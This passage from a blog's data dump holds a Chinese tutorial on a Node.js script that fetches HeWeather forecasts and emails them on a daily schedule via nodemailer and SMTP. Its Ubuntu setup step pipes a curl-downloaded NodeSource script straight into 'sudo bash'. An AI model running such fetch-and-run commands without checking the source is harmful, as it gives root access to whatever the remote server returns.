src=\"/images/in-post/post-blog-DNNartstyle0.jpg\" alt=\"Pic\"></td>\n<td><img src=\"/images/in-post/post-blog-DNNartstyle1.png\" alt=\"Pic\"></td>\n<td><img src=\"/images/in-post/post-blog-DNNartstyle2.png\" alt=\"Pic\"></td>\n</tr>\n<tr>\n<td><img src=\"/images/in-post/post-blog-DNNartstyle0.jpg\" alt=\"Pic\"></td>\n<td><img src=\"/images/in-post/post-blog-DNNartstyle5.jpg\" alt=\"Pic\"></td>\n<td><img src=\"/images/in-post/post-blog-DNNartstyle6.png\" alt=\"Pic\"></td>\n</tr>\n</tbody>\n</table>\n<p>用于训练图片源于网络，侵删</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><p><a href=\"https://github.com/miyunluo/pytorch-beginner/tree/master/neural-artistic-style\" target=\"_blank\" rel=\"noopener\">github</a></p>\n"},{"layout":"post","title":"50行实现定时发送天气预报提醒邮件","_content":"\n> “想不想每天给她/他发送一条天气提醒呢”\n\n\n## 起因\n\n1. 魔都的天气，太魔性了...尤其是梅雨季\n2. ios自带天气app无提醒，经常忘记查看。使用过 Mr.Weather、Colorful Pro，提醒又过多，导致通知栏里全是天气通知\n3. 需求其实很简单，一份简介明了又不扰人的天气提醒\n4. 使用邮件无需额外费用，比短信提醒易于实现，使用node.js更是十分简单\n\n---\n\n## Setup\n\n使用node.js实现天气获取与邮件发送，首先需要安装node。\n\n+ macOS 推荐使用 homebrew 进行安装，也可下载Installer安装\n\n  ```shell\n  >$ brew install node\n  ```\n\n+ Ubuntu\n\n  ```Shell\n  >$ curl -sL https://deb.nodesource.com/setup_10.x | sudo -E bash -\n  >$ sudo apt-get install -y nodejs\n  ```\n\n+ Windows\n\n  直接下载Installer https://nodejs.org/en/download\n\n## 注册Heweather\n\n获取天气信息需要依赖提供天气查询服务的网站。在对比了和风天气与丫丫天气后，发现同为免费用户的情况下，和风天气提供的信息更为全面，这里使用和风。(至今没收到丫丫的验证邮件...)\n\n+ 用户注册\n\n  地址：http://www.heweather.com\n\n+ 获得想要查询城市或区域的编码：\n\n  地址：https://www.heweather.com/documents/city\n\n  如 松江区：CN101020900，闵行区：CN101020200。\n\n+ 获得认证key\n\n  注册后登录，地址：控制台->我的控制台->认证key\n\n+ 免费查询api\n\n  根据和风天气文档，获取天气信息大合集的url如下，返回一份json数据，具体字段信息请参考官方文档\n\n  https://free-api.heweather.com/s6/weather?location=CITY_CODE&key=YOUR_KEY\n\n  将 **CITY_CODE** 替换为第二步得到的城市代码，如CN101020900\n\n  将 **YOUR_KEY** 替换为第三步自己的key\n\n## 开启SMTP\n\n使用smtp协议进行邮件发送，需要开启邮箱的smtp服务，一般在邮箱的设置中。\n\n以163邮箱为例，smtp在 设置->POP3/SMTP/IMAP 选项下。\n\n![img](/images/in-post/post-blog-POP3SMTPIMAP.png)\n\n初次开启，会要求设置授权码，此授权码就是之后使用smtp协议发邮件时的密码，注意与邮箱登录密码区别。\n\n![img](/images/in-post/post-blog-AuthCode.png)\n\nQQ邮箱开启方法类似。\n\n---\n\n## 问题分解\n\n1. **请求并处理天气数据**\n\n首先当然是要获得需要的天气数据，由于要进行网络请求，这里使用 `request` 模块。\n\n```javascript\nconst request=require('request');\nconst url= 'https://free-api.heweather.com/s6/weather?location=***********&key=********************************';\nrequest(url,(error,response,body)=>{};\n```\n\n返回参数 `body` 包含我们需要的天气信息，部分信息格式化后的内容如下。\n\n```json\n{\n    \"HeWeather6\": [\n        {\n            \"basic\": {\n                \"cid\": \"CN101020900\", \n                \"location\": \"松江\", \n                \"parent_city\": \"上海\", \n                \"admin_area\": \"上海\", \n                \"cnty\": \"中国\", \n                \"lat\": \"31.03046989\", \n                \"lon\": \"121.22354126\", \n                \"tz\": \"+8.00\"\n            }, \n            \"status\": \"ok\", \n            \"now\": {\n                \"cloud\": \"0\", \n                \"cond_code\": \"101\", \n                \"cond_txt\": \"多云\", \n                \"fl\": \"38\", \n                \"hum\": \"56\", \n                \"pcpn\": \"0.0\", \n                \"pres\": \"1003\", \n                \"tmp\": \"34\", \n                \"vis\": \"10\", \n                \"wind_deg\": \"123\", \n                \"wind_dir\": \"东南风\", \n                \"wind_sc\": \"2\", \n                \"wind_spd\": \"6\"\n            }, \n            \"daily_forecast\": [\n                {\n                    \"cond_code_d\": \"100\", \n                    \"cond_code_n\": \"101\", \n                    \"cond_txt_d\": \"晴\", \n                    \"cond_txt_n\": \"多云\", \n                    \"date\": \"2018-05-16\", \n                    \"hum\": \"74\", \n                    \"mr\": \"05:40\", \n                    \"ms\": \"19:34\", \n                    \"pcpn\": \"0.0\", \n                    \"pop\": \"0\", \n                    \"pres\": \"1005\", \n                    \"sr\": \"04:59\", \n                    \"ss\": \"18:44\", \n                    \"tmp_max\": \"36\", \n                    \"tmp_min\": \"25\", \n                    \"uv_index\": \"10\", \n                    \"vis\": \"13\", \n                    \"wind_deg\": \"181\", \n                    \"wind_dir\": \"南风\", \n                    \"wind_sc\": \"4-5\", \n                    \"wind_spd\": \"25\"\n                }, \n                \n            ], \n            ......\n```\n\n当然根据和风天气的文档，已知这是一个json文件，直接使用json parser对 `body` 处理即可。\n\n```javascript\ndata=JSON.parse(body);\ndata=data.HeWeather6[0];\n```\n\njson中包含的信息比较多，可以筛选一些重要的信息来使用。比如 日出时间: `daliy_forecast.sr`，日落时间: `daliy_forecast.ss`，最高温度: `daliy_forecast.tmp_max`，最低温度: `daliy_forecast.tmp_min`，降水概率: `daliy_forecast.pop` 等。\n\n2. **邮件编排**\n\n获得了天气数据后，就可以发送邮件了，但是如何编辑排列得到的天气数据也是一个需要考虑的问题，发一堆杂乱无章的数据，视觉观感不好。当然邮件本身支持html样式，可以编写一个简单的html样式来排列邮件内容。\n\n最终进行邮件发送时，只需要将这一样式表拼接为字符串即可。\n\n```html\n<div>\n   <div>\n    <h1>给主席的天气预报</h1>\n   </div>\n   <div>\n    <h3 style=\"margin:20px auto 10px auto\"> data.daily_forecast[0].date   data.basic.location 区</h3>\n   <div>\n     <p>\n     \t<span>日出时间: </span>\n     \t<span> data.daily_forecast[0].sr </span>\n     \t<span style=\"width:40%;margin-left: 30px\">日落时间: </span>\n     \t<span> data.daily_forecast[0].ss+ </span>\n     </p>\n     <p>\n     \t<span>白天: </span>\n     \t<span> data.daily_forecast[0].cond_txt_d </span>\n     \t<span style=\"width:40%;margin-left: 30px\">晚间: </span>\n     \t<span> data.daily_forecast[0].cond_txt_n </span>\n     </p>\n     <p>\n     \t<span>最高温度: </span>\n     \t<span><b>data.daily_forecast[0].tmp_max</b>℃</span>\n     \t<span style=\"width:40%;margin-left: 30px\">最低温度: </span>\n     \t<span><b>data.daily_forecast[0].tmp_min</b>℃</span>\n     \t</p>\n     <p>\n     \t<span>紫外线强度指数: </span>\n     \t<span><b>data.daily_forecast[0].uv_index</b></span>\n     </p>\n     <p>\n     \t<span>降水概率: </span>\n     \t<span>data.daily_forecast[0].pop %</span>\n     </p>\n     <p>\n     \t<span>风力: </span>\n     \t<span> data.daily_forecast[0].wind_sc </span>\n     </p>\n     <p>\n     \t<span>穿衣建议: </span>\n     \t<span> data.lifestyle[1].txt </span>\n     </p>\n     <br>\n     <p>\n     \t<small>注 紫外线强度: 0-2 无危险 | 3-5 较轻伤害 | 6-7 很大伤害 | 8-10 极高伤害 | 11+ 及其危险</small>\n     </p>\n    </div>\n   </div>\n</div>\n```\n\n3. **邮件发送**\n\n发送邮件使用 `nodemailer` 模块。\n\n```javascript\nconst nodemailer=require('nodemailer');\n// 建立SMTP连接\nvar smtpTransport = nodemailer.createTransport({\n  host: \"smtp.163.com\", // smtp主机\n  secureConnection: true, // 使用SSL\n  port: 465, // SMTP 端口\n  auth: {\n    user: \"邮箱前缀@163.com\", // 账号\n    pass: \"******\" // 授权码\n  }\n});\n \n// 设置邮件内容\nvar mailOptions = {\n  from: \"名字 <邮箱前缀@163.com>\", // 发件地址\n  to: \"XXXXXXX@example.com\", // 收件地址\n  subject: \"Hello\", // 标题\n  html: \"<b>邮件由nodemailer发送</b>\" // html实例，替换为第2步的天气内容\n}\n \n// 发送邮件\nsmtpTransport.sendMail(mailOptions, function(error, response){\n  if(error){\n    console.log(error);\n  }else{\n    console.log(\"Message sent: \" + response.message);\n  }\n  smtpTransport.close(); // 关闭连接\n});\n```\n\n4. **定时**\n\nUnix 与 Linux本身提供了定时启动指令 `crontab`，当然 node.js 也有自己的定时器，而且使用起来更加方便。\n\n使用模块 `node-schedule`。\n\n```javascript\nconst schedule=require('node-schedule');\nvar rule = new schedule.RecurrenceRule();\nrule.hour = 6; rule.minute = 30; rule.second = 0; // 定时 06:30:00\nvar run = schedule.scheduleJob(rule, YOUR_FUNC); // YOUR_FUNC 为想要执行的函数\n```\n\n至此所有模块已经基本完成，之后将天气查询，与邮件发送功能封装在一个函数中，传入 `schudle.scheduleJob` 即可。\n\n## 完整代码\n\n```javascript\nconst request = require('request');\nconst nodemailer = require('nodemailer');\nconst schedule = require('node-schedule');\nvar rule = new schedule.RecurrenceRule();\nrule.hour = 6; rule.minute = 30; rule.second = 0; // 设置定时发送的时间\nvar data= '';\nvar j = schedule.scheduleJob(rule, function(){\n\tconsole.log('发送天气预报...');\n  \tsendWeather();\n});\nfunction sendWeather(){\n\tconst url= 'https://free-api.heweather.com/s6/weather/forecast?location=城市代码&key=自己的key'; // 城市代码: 从和风天气文档获得，key: 注册和风天气得到\n\trequest(url,(error,response,body)=>{\n\t\tif(error){\n\t\t\tconsole.log(error);\n\t\t}\n\t\tdata=JSON.parse(body);\n\t\tdata=data.HeWeather6[0]\n\n\t\tlet transporter=nodemailer.createTransport({\n\t\thost: \"smtp.163.com\", // 163邮箱的smtp服务器地址\n\t\tport: 465,\n\t\tsecureConnection: true,\n\t\tauth: {\n\t\t\tuser:'邮箱前缀@163.com', // 邮箱地址\n\t\t\tpass:'*******' // smtp授权码，不是邮箱的登录密码\n\t\t\t}\n\t\t});\n\t\tlet mailOptions={\n\t\t\tfrom: \"预报君 <邮箱前缀@163.com>\", // 与发件地址一致，否则报错\n\t\t\tto: \"to someone @foxmail.com\", // 要发送的邮箱地址\n\t\t\tsubject: data.daily_forecast[0].date + 'の天気',\n\t\t\ttext:'城市 :'+data.basic.location+'时间：'+ data.daily_forecast[0].date,\n\t\t\thtml: '<div><div><h1>给主席的天气预报</h1></div><div><h3 style=\"margin:20px auto 10px auto\">' + data.daily_forecast[0].date + ' ' + data.basic.location + '区</h3><div><p><span>日出时间: </span><span>'+data.daily_forecast[0].sr+'</span><span style=\"width:40%;margin-left: 30px\">日落时间: </span><span>'+data.daily_forecast[0].ss+'</span></p><p><span>白天: </span><span>'+data.daily_forecast[0].cond_txt_d+'</span><span style=\"width:40%;margin-left: 30px\">晚间: </span><span>'+data.daily_forecast[0].cond_txt_n+'</span></p><p><span>最高温度: </span><span><b>'+data.daily_forecast[0].tmp_max+'</b>℃</span><span style=\"width:40%;margin-left: 30px\">最低温度: </span><span><b>'+data.daily_forecast[0].tmp_min+'</b>℃</span></p><p><span>紫外线强度指数: </span><span><b>'+data.daily_forecast[0].uv_index+'</b></span></p><p><span>降水概率: </span><span>'+data.daily_forecast[0].pop+' %</span></p><p><span>风力: </span><span>'+data.daily_forecast[0].wind_sc+'</span></p><p><span>穿衣建议: </span><span>' + data.lifestyle[1].txt + '</span></p><br><p><small>注 紫外线强度: 0-2 无危险 | 3-5 较轻伤害 | 6-7 很大伤害 | 8-10 极高伤害 | 11+ 及其危险</small></p></div></div></div>'\n\t\t};\n\t\ttransporter.sendMail(mailOptions,(err,info)=>{\n\t\t\tif(err){\n\t\t\t\treturn console.log(err);\n\t\t\t}else{\n\t\t\t\tconsole.log('Message %s sent %s',info.messageId,info.response);\n\t\t\t}\n\t\t\ttransporter.close();\n\t\t});\n\t});\n}\n```\n\n## 最终效果\n\n![img](/images/in-post/post-blog-WeatherEmail.jpg)\n\n## 最后\n\n只需要不到50行就可以自动发送天气邮件了，你是不是也想给她/他每天发一条天气提醒呢？不妨试一试。[github](https://github.com/miyunluo/Funny_Tools/tree/master/Weather_Email_Reporter)\n\n","source":"_posts/2018-05-16-weathemail.markdown","raw":"---\nlayout:     post\ntitle:      \"50行实现定时发送天气预报提醒邮件\"\ntags:\n    - fun\n---\n\n> “想不想每天给她/他发送一条天气提醒呢”\n\n\n## 起因\n\n1. 魔都的天气，太魔性了...尤其是梅雨季\n2. ios自带天气app无提醒，经常忘记查看。使用过 Mr.Weather、Colorful Pro，提醒又过多，导致通知栏里全是天气通知\n3. 需求其实很简单，一份简介明了又不扰人的天气提醒\n4. 使用邮件无需额外费用，比短信提醒易于实现，使用node.js更是十分简单\n\n---\n\n## Setup\n\n使用node.js实现天气获取与邮件发送，首先需要安装node。\n\n+ macOS 推荐使用 homebrew 进行安装，也可下载Installer安装\n\n  ```shell\n  >$ brew install node\n  ```\n\n+ Ubuntu\n\n  ```Shell\n  >$ curl -sL https://deb.nodesource.com/setup_10.x | sudo -E bash -\n  >$ sudo apt-get install -y nodejs\n  ```\n\n+ Windows\n\n  直接下载Installer https://nodejs.org/en/download\n\n## 注册Heweather\n\n获取天气信息需要依赖提供天气查询服务的网站。在对比了和风天气与丫丫天气后，发现同为免费用户的情况下，和风天气提供的信息更为全面，这里使用和风。(至今没收到丫丫的验证邮件...)\n\n+ 用户注册\n\n  地址：http://www.heweather.com\n\n+ 获得想要查询城市或区域的编码：\n\n  地址：https://www.heweather.com/documents/city\n\n  如 松江区：CN101020900，闵行区：CN101020200。\n\n+ 获得认证key\n\n  注册后登录，地址：控制台->我的控制台->认证key\n\n+ 免费查询api\n\n  根据和风天气文档，获取天气信息大合集的url如下，返回一份json数据，具体字段信息请参考官方文档\n\n  https://free-api.heweather.com/s6/weather?location=CITY_CODE&key=YOUR_KEY\n\n  将 **CITY_CODE** 替换为第二步得到的城市代码，如CN101020900\n\n  将 **YOUR_KEY** 替换为第三步自己的key\n\n## 开启SMTP\n\n使用smtp协议进行邮件发送，需要开启邮箱的smtp服务，一般在邮箱的设置中。\n\n以163邮箱为例，smtp在 设置->POP3/SMTP/IMAP 选项下。\n\n![img](/images/in-post/post-blog-POP3SMTPIMAP.png)\n\n初次开启，会要求设置授权码，此授权码就是之后使用smtp协议发邮件时的密码，注意与邮箱登录密码区别。\n\n![img](/images/in-post/post-blog-AuthCode.png)\n\nQQ邮箱开启方法类似。\n\n---\n\n## 问题分解\n\n1. **请求并处理天气数据**\n\n首先当然是要获得需要的天气数据，由于要进行网络请求，这里使用 `request` 模块。\n\n```javascript\nconst request=require('request');\nconst url= 'https://free-api.heweather.com/s6/weather?location=***********&key=********************************';\nrequest(url,(error,response,body)=>{};\n```\n\n返回参数 `body` 包含我们需要的天气信息，部分信息格式化后的内容如下。\n\n```json\n{\n    \"HeWeather6\": [\n        {\n            \"basic\": {\n                \"cid\": \"CN101020900\", \n                \"location\": \"松江\", \n                \"parent_city\": \"上海\", \n                \"admin_area\": \"上海\", \n                \"cnty\": \"中国\", \n                \"lat\": \"31.03046989\", \n                \"lon\": \"121.22354126\", \n                \"tz\": \"+8.00\"\n            }, \n            \"status\": \"ok\", \n            \"now\": {\n                \"cloud\": \"0\", \n                \"cond_code\": \"101\", \n                \"cond_txt\": \"多云\", \n                \"fl\": \"38\", \n                \"hum\": \"56\", \n                \"pcpn\": \"0.0\", \n                \"pres\": \"1003\", \n                \"tmp\": \"34\", \n                \"vis\": \"10\", \n                \"wind_deg\": \"123\", \n                \"wind_dir\": \"东南风\", \n                \"wind_sc\": \"2\", \n                \"wind_spd\": \"6\"\n            }, \n            \"daily_forecast\": [\n                {\n                    \"cond_code_d\": \"100\", \n                    \"cond_code_n\": \"101\", \n                    \"cond_txt_d\": \"晴\", \n                    \"cond_txt_n\": \"多云\", \n                    \"date\": \"2018-05-16\", \n                    \"hum\": \"74\", \n                    \"mr\": \"05:40\", \n                    \"ms\": \"19:34\", \n                    \"pcpn\": \"0.0\", \n                    \"pop\": \"0\", \n                    \"pres\": \"1005\", \n                    \"sr\": \"04:59\", \n                    \"ss\": \"18:44\", \n                    \"tmp_max\": \"36\", \n                    \"tmp_min\": \"25\", \n                    \"uv_index\": \"10\", \n                    \"vis\": \"13\", \n                    \"wind_deg\": \"181\", \n                    \"wind_dir\": \"南风\", \n                    \"wind_sc\": \"4-5\", \n                    \"wind_spd\": \"25\"\n                }, \n                \n            ], \n            ......\n```\n\n当然根据和风天气的文档，已知这是一个json文件，直接使用json parser对 `body` 处理即可。\n\n```javascript\ndata=JSON.parse(body);\ndata=data.HeWeather6[0];\n```\n\njson中包含的信息比较多，可以筛选一些重要的信息来使用。比如 日出时间: `daliy_forecast.sr`，日落时间: `daliy_forecast.ss`，最高温度: `daliy_forecast.tmp_max`，最低温度: `daliy_forecast.tmp_min`，降水概率: `daliy_forecast.pop` 等。\n\n2. **邮件编排**\n\n获得了天气数据后，就可以发送邮件了，但是如何编辑排列得到的天气数据也是一个需要考虑的问题，发一堆杂乱无章的数据，视觉观感不好。当然邮件本身支持html样式，可以编写一个简单的html样式来排列邮件内容。\n\n最终进行邮件发送时，只需要将这一样式表拼接为字符串即可。\n\n```html\n<div>\n   <div>\n    <h1>给主席的天气预报</h1>\n   </div>\n   <div>\n    <h3 style=\"margin:20px auto 10px auto\"> data.daily_forecast[0].date   data.basic.location 区</h3>\n   <div>\n     <p>\n     \t<span>日出时间: </span>\n     \t<span> data.daily_forecast[0].sr </span>\n     \t<span style=\"width:40%;margin-left: 30px\">日落时间: </span>\n     \t<span> data.daily_forecast[0].ss+ </span>\n     </p>\n     <p>\n     \t<span>白天: </span>\n     \t<span> data.daily_forecast[0].cond_txt_d </span>\n     \t<span style=\"width:40%;margin-left: 30px\">晚间: </span>\n     \t<span> data.daily_forecast[0].cond_txt_n </span>\n     </p>\n     <p>\n     \t<span>最高温度: </span>\n     \t<span><b>data.daily_forecast[0].tmp_max</b>℃</span>\n     \t<span style=\"width:40%;margin-left: 30px\">最低温度: </span>\n     \t<span><b>data.daily_forecast[0].tmp_min</b>℃</span>\n     \t</p>\n     <p>\n     \t<span>紫外线强度指数: </span>\n     \t<span><b>data.daily_forecast[0].uv_index</b></span>\n     </p>\n     <p>\n     \t<span>降水概率: </span>\n     \t<span>data.daily_forecast[0].pop %</span>\n     </p>\n     <p>\n     \t<span>风力: </span>\n     \t<span> data.daily_forecast[0].wind_sc </span>\n     </p>\n     <p>\n     \t<span>穿衣建议: </span>\n     \t<span> data.lifestyle[1].txt </span>\n     </p>\n     <br>\n     <p>\n     \t<small>注 紫外线强度: 0-2 无危险 | 3-5 较轻伤害 | 6-7 很大伤害 | 8-10 极高伤害 | 11+ 及其危险</small>\n     </p>\n    </div>\n   </div>\n</div>\n```\n\n3. **邮件发送**\n\n发送邮件使用 `nodemailer` 模块。\n\n```javascript\nconst nodemailer=require('nodemailer');\n// 建立SMTP连接\nvar smtpTransport = nodemailer.createTransport({\n  host: \"smtp.163.com\", // smtp主机\n  secureConnection: true, // 使用SSL\n  port: 465, // SMTP 端口\n  auth: {\n    user: \"邮箱前缀@163.com\", // 账号\n    pass: \"******\" // 授权码\n  }\n});\n \n// 设置邮件内容\nvar mailOptions = {\n  from: \"名字 <邮箱前缀@163.com>\", // 发件地址\n  to: \"XXXXXXX@example.com\", // 收件地址\n  subject: \"Hello\", // 标题\n  html: \"<b>邮件由nodemailer发送</b>\" // html实例，替换为第2步的天气内容\n}\n \n// 发送邮件\nsmtpTransport.sendMail(mailOptions, function(error, response){\n  if(error){\n    console.log(error);\n  }else{\n    console.log(\"Message sent: \" + response.message);\n  }\n  smtpTransport.close(); // 关闭连接\n});\n```\n\n4. **定时**\n\nUnix 与 Linux本身提供了定时启动指令 `crontab`，当然 node.js 也有自己的定时器，而且使用起来更加方便。\n\n使用模块 `node-schedule`。\n\n```javascript\nconst schedule=require('node-schedule');\nvar rule = new schedule.RecurrenceRule();\nrule.hour = 6; rule.minute = 30; rule.second = 0; // 定时 06:30:00\nvar run = schedule.scheduleJob(rule, YOUR_FUNC); // YOUR_FUNC 为想要执行的函数\n```\n\n至此所有模块已经基本完成，之后将天气查询，与邮件发送功能封装在一个函数中，传入 `schudle.scheduleJob` 即可。\n\n## 完整代码\n\n```javascript\nconst request = require('request');\nconst nodemailer = require('nodemailer');\nconst schedule = require('node-schedule');\nvar rule = new schedule.RecurrenceRule();\nrule.hour = 6; rule.minute = 30; rule.second = 0; // 设置定时发送的时间\nvar data= '';\nvar j = schedule.scheduleJob(rule, function(){\n\tconsole.log('发送天气预报...');\n  \tsendWeather();\n});\nfunction sendWeather(){\n\tconst url= 'https://free-api.heweather.com/s6/weather/forecast?location=城市代码&key=自己的key'; // 城市代码: 从和风天气文档获得，key: 注册和风天气得到\n\trequest(url,(error,response,body)=>{\n\t\tif(error){\n\t\t\tconsole.log(error);\n\t\t}\n\t\tdata=JSON.parse(body);\n\t\tdata=data.HeWeather6[0]\n\n\t\tlet transporter=nodemailer.createTransport({\n\t\thost: \"smtp.163.com\", // 163邮箱的smtp服务器地址\n\t\tport: 465,\n\t\tsecureConnection: true,\n\t\tauth: {\n\t\t\tuser:'邮箱前缀@163.com', // 邮箱地址\n\t\t\tpass:'*******' // smtp授权码，不是邮箱的登录密码\n\t\t\t}\n\t\t});\n\t\tlet mailOptions={\n\t\t\tfrom: \"预报君 <邮箱前缀@163.com>\", // 与发件地址一致，否则报错\n\t\t\tto: \"to someone @foxmail.com\", // 要发送的邮箱地址\n\t\t\tsubject: data.daily_forecast[0].date + 'の天気',\n\t\t\ttext:'城市 :'+data.basic.location+'时间：'+ data.daily_forecast[0].date,\n\t\t\thtml: '<div><div><h1>给主席的天气预报</h1></div><div><h3 style=\"margin:20px auto 10px auto\">' + data.daily_forecast[0].date + ' ' + data.basic.location + '区</h3><div><p><span>日出时间: </span><span>'+data.daily_forecast[0].sr+'</span><span style=\"width:40%;margin-left: 30px\">日落时间: </span><span>'+data.daily_forecast[0].ss+'</span></p><p><span>白天: </span><span>'+data.daily_forecast[0].cond_txt_d+'</span><span style=\"width:40%;margin-left: 30px\">晚间: </span><span>'+data.daily_forecast[0].cond_txt_n+'</span></p><p><span>最高温度: </span><span><b>'+data.daily_forecast[0].tmp_max+'</b>℃</span><span style=\"width:40%;margin-left: 30px\">最低温度: </span><span><b>'+data.daily_forecast[0].tmp_min+'</b>℃</span></p><p><span>紫外线强度指数: </span><span><b>'+data.daily_forecast[0].uv_index+'</b></span></p><p><span>降水概率: </span><span>'+data.daily_forecast[0].pop+' %</span></p><p><span>风力: </span><span>'+data.daily_forecast[0].wind_sc+'</span></p><p><span>穿衣建议: </span><span>' + data.lifestyle[1].txt + '</span></p><br><p><small>注 紫外线强度: 0-2 无危险 | 3-5 较轻伤害 | 6-7 很大伤害 | 8-10 极高伤害 | 11+ 及其危险</small></p></div></div></div>'\n\t\t};\n\t\ttransporter.sendMail(mailOptions,(err,info)=>{\n\t\t\tif(err){\n\t\t\t\treturn console.log(err);\n\t\t\t}else{\n\t\t\t\tconsole.log('Message %s sent %s',info.messageId,info.response);\n\t\t\t}\n\t\t\ttransporter.close();\n\t\t});\n\t});\n}\n```\n\n## 最终效果\n\n![img](/images/in-post/post-blog-WeatherEmail.jpg)\n\n## 最后\n\n只需要不到50行就可以自动发送天气邮件了，你是不是也想给她/他每天发一条天气提醒呢？不妨试一试。[github](https://github.com/miyunluo/Funny_Tools/tree/master/Weather_Email_Reporter)\n\n","slug":"weathemail","published":1,"date":"2018-05-15T16:00:00.000Z","updated":"2018-05-16T12:10:41.000Z","comments":1,"photos":[],"link":"","_id":"cji4qizbf000wrikeun42i8rl","content":"<blockquote>\n<p>“想不想每天给她/他发送一条天气提醒呢”</p>\n</blockquote>\n<h2 id=\"起因\"><a href=\"#起因\" class=\"headerlink\" title=\"起因\"></a>起因</h2><ol>\n<li>魔都的天气，太魔性了…尤其是梅雨季</li>\n<li>ios自带天气app无提醒，经常忘记查看。使用过 Mr.Weather、Colorful Pro，提醒又过多，导致通知栏里全是天气通知</li>\n<li>需求其实很简单，一份简介明了又不扰人的天气提醒</li>\n<li>使用邮件无需额外费用，比短信提醒易于实现，使用node.js更是十分简单</li>\n</ol>\n<hr>\n<h2 id=\"Setup\"><a href=\"#Setup\" class=\"headerlink\" title=\"Setup\"></a>Setup</h2><p>使用node.js实现天气获取与邮件发送，首先需要安装node。</p>\n<ul>\n<li><p>macOS 推荐使用 homebrew 进行安装，也可下载Installer安装</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;</span>$ brew install node</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>Ubuntu</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;</span>$ curl -sL https://deb.nodesource.com/setup_10.x | sudo -E bash -</span><br><span class=\"line\"><span class=\"meta\">&gt;</span>$ sudo apt-get install -y nodejs</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>Windows</p>\n<p>直接下载Installer <a href=\"https://nodejs.org/en/download\" target=\"_blank\" rel=\"noopener\">https://nodejs.org/en/download</a></p>\n</li>\n</ul>\n<h2 id=\"注册Heweather\"><a href=\"#注册Heweather\" class=\"headerlink\" title=\"注册Heweather\"></a>注册Heweather</h2><p>获取天气信息需要依赖提供天气查询服务的网站。在对比了和风天气与丫丫天气后，发现同为免费用户的情况下，和风天气提供的信息更为全面，这里使用和风。(至今没收到丫丫的验证邮件…)</p>\n<ul>\n<li><p>用户注册</p>\n<p>地址：<a href=\"http://www.heweather.com\" target=\"_blank\" rel=\"noopener\">http://www.heweather.com</a></p>\n</li>\n<li><p>获得想要查询城市或区域的编码：</p>\n<p>地址：<a href=\"https://www.heweather.com/documents/city\" target=\"_blank\" rel=\"noopener\">https://www.heweather.com/documents/city</a></p>\n<p>如 松江区：CN101020900，闵行区：CN101020200。</p>\n</li>\n<li><p>获得认证key</p>\n<p>注册后登录，地址：控制台-&gt;我的控制台-&gt;认证key</p>\n</li>\n<li><p>免费查询api</p>\n<p>根据和风天气文档，获取天气信息大合集的url如下，返回一份json数据，具体字段信息请参考官方文档</p>\n<p><a href=\"https://free-api.heweather.com/s6/weather?location=CITY_CODE&amp;key=YOUR_KEY\" target=\"_blank\" rel=\"noopener\">https://free-api.heweather.com/s6/weather?location=CITY_CODE&amp;key=YOUR_KEY</a></p>\n<p>将 <strong>CITY_CODE</strong> 替换为第二步得到的城市代码，如CN101020900</p>\n<p>将 <strong>YOUR_KEY</strong> 替换为第三步自己的key</p>\n</li>\n</ul>\n<h2 id=\"开启SMTP\"><a href=\"#开启SMTP\" class=\"headerlink\" title=\"开启SMTP\"></a>开启SMTP</h2><p>使用smtp协议进行邮件发送，需要开启邮箱的smtp服务，一般在邮箱的设置中。</p>\n<p>以163邮箱为例，smtp在 设置-&gt;POP3/SMTP/IMAP 选项下。</p>\n<p><img src=\"/images/in-post/post-blog-POP3SMTPIMAP.png\" alt=\"img\"></p>\n<p>初次开启，会要求设置授权码，此授权码就是之后使用smtp协议发邮件时的密码，注意与邮箱登录密码区别。</p>\n<p><img src=\"/images/in-post/post-blog-AuthCode.png\" alt=\"img\"></p>\n<p>QQ邮箱开启方法类似。</p>\n<hr>\n<h2 id=\"问题分解\"><a href=\"#问题分解\" class=\"headerlink\" title=\"问题分解\"></a>问题分解</h2><ol>\n<li><strong>请求并处理天气数据</strong></li>\n</ol>\n<p>首先当然是要获得需要的天气数据，由于要进行网络请求，这里使用 <code>request</code> 模块。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> request=<span class=\"built_in\">require</span>(<span class=\"string\">'request'</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> url= <span class=\"string\">'https://free-api.heweather.com/s6/weather?location=***********&amp;key=********************************'</span>;</span><br><span class=\"line\">request(url,(error,response,body)=&gt;&#123;&#125;;</span><br></pre></td></tr></table></figure>\n<p>返回参数 <code>body</code> 包含我们需要的天气信息，部分信息格式化后的内容如下。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span 